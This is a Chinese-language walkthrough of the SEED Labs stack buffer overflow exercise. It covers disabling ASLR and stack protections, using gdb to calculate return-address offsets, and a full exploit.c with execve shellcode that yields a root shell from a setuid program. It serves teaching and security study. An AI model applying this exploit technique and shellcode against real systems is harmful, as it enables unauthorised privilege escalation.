**前言：本文是基于美国雪城大学的seed实验所做的缓冲区溢出实验，笔者在进行实验的时候参考了网上已有的部分博客，但是发现存在部分细节没有详细解释，导致实验过程中难以复现上述攻击。因此重新梳理了整个实验过程，涉及原理的内容不再赘述，详见下面链接中提供的实验说明，希望对各位读者起到一定帮助。**

![buffer_overflow_m.png](https://image.3001.net/images/20191202/15752658709873.png!small)

>
> 实验参考资料和实验环境下载：<https://seedsecuritylabs.org/Labs_16.04/Software/Buffer_Overflow/>

##  一、 实验介绍

缓冲区溢出是指程序试图写入超出预分配范围的数据的条件固定长度的缓冲区的漏洞。恶意用户可以使用此漏洞来更改程序的流控制，导致执行恶意代码。此漏洞是由于用于数据（例如缓冲区）和用于控件的存储（例如返回地址）混合存储引起的：数据部分中的溢出会因为溢出会更改返回地址，所以会影响程序的控制流程。本实验的任务是设计一种利用此漏洞并最终获得root特权的方案。

##  二、实验原理

下图给出一个示例代码，展示了函数调用过程中堆栈的结构，在实验中，我们的恶意代码就是通过buffer数组传入栈中，因为传入的数据超过了buffer数组预定义的长度，而strcpy函数不进行边界检查，导致了恶意代码覆盖原有的栈内信息，从而修改返回地址，控制代码执行我们插入的恶意代码。因此我们的任务是，根据右图栈的结构，推断出返回地址和buffer数组的相对位置，从而精准的覆盖原来的返回地址，写入恶意代码的内存地址。

![](https://image.3001.net/images/20191125/1574666623_5ddb817f22d0f.png!small)

##  三、实验步骤

1\. 关闭地址空间随机化

    
    
    $sudo sysctl -w kernel.randomize_va_space=0

2\. 关闭栈不可执行（NX）机制编译漏洞程序，并赋予该程序root权限

    
    
    sudo su
    
        gcc -m32 -g -z execstack -fno-stack-protector -o stack stack.c
    
        chmod u+s stack
    
        exit

3.使用另一个shell程序（zsh）代替/bin/bash

    
    
    $ sudo rm /bin/sh
    
        $ sudo ln -s /bin/zsh /bin/sh
    
        $ exit

4\. 确定植入恶意代码的位置

输入命令：

    
    
    gdb stack
    
        disas main

![](https://image.3001.net/images/20191125/1574664142_5ddb77ced2072.png!small)

确定str在内存中的位置=ebp-0x211，在main函数任一位置加断点，查看ebp的信息

![](https://image.3001.net/images/20191125/1574669106_5ddb8b3222e48.png!small)![](https://image.3001.net/images/20191125/1574669110_5ddb8b3645189.png!small)

我们打算将攻击代码放入距离buffer之后100字节的位置，因此恶意代码的地址=0xbfffed08-0x211+100(0x64)=0xbfffeb5b。

5.确定返回地址的位置

与刚才的方法如出一辙，查看漏洞函数bof的汇编代码

![](https://image.3001.net/images/20191125/1574665715_5ddb7df3f153d.png!small)

通过bof的代码我们发现，在调用strcpy函数之前，需要将两个参数str，buffer先后压栈，因此，return地址=buffer地址+0x20+0x04。即将在buffer[36]的位置放入要跳转到的恶意代码地址，去覆盖原来的return
address。（注意：如果buffer数组大小变化，那么它到ebp的相对位置也会和变化，在本例中是36，这时需要重新计算return地址的相对位置）

6.攻击程序

通过上述分析，构造恶意代码和对应的地址写入badfile文件的恰当位置，使得漏洞程序被攻击，从而实现提权攻击。

    
    
    /* exploit.c  */
    
    /* A program that creates a file containing code for launching shell*/
    #include <stdlib.h>
    #include <stdio.h>
    #include <string.h>
    char shellcode[]=
        "\x31\xc0"             /* xorl    %eax,%eax              */
        "\x50"                 /* pushl   %eax                   */
        "\x68""//sh"           /* pushl   $0x68732f2f            */
        "\x68""/bin"           /* pushl   $0x6e69622f            */
        "\x89\xe3"             /* movl    %esp,%ebx              */
        "\x50"                 /* pushl   %eax                   */
        "\x53"                 /* pushl   %ebx                   */
        "\x89\xe1"             /* movl    %esp,%ecx              */
        "\x99"                 /* cdq                            */
        "\xb0\x0b"             /* movb    $0x0b,%al              */
        "\xcd\x80"             /* int     $0x80                  */
    ;
    
    void main(int argc, char **argv)
    {
        char buffer[517];
        FILE *badfile;
    
        /* Initialize buffer with 0x90 (NOP instruction) */
        memset(&buffer, 0x90, 517);
    
        /* You need to fill the buffer with appropriate contents here */ 
        
        //strcpy(buffer,"123456");
        strcpy(buffer+36,"\x5b\xeb\xff\xbf");//覆盖bof返回地址
        strcpy(buffer+100,shellcode);//在buffer+100处写入攻击代码
    
        /* Save the contents to the file "badfile" */
        badfile = fopen("./badfile", "w");
        fwrite(buffer, 517, 1, badfile);
        fclose(badfile);
    }

7.攻击结果

编译运行攻击程序构造badfile，然后运行漏洞程序stack，结果如下：

![](https://image.3001.net/images/20191125/1574669344_5ddb8c200639d.png!small)显示#，表示获得root权限，攻击成功！

tips:如果攻击结果显示segmentation
fault，则说明内存地址计算错误，请重新反汇编计算；如果出现$，则说明未向stack程序赋予root权限。参照第二点处理。

 ***本文原创作者：吃石榴不吐籽，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

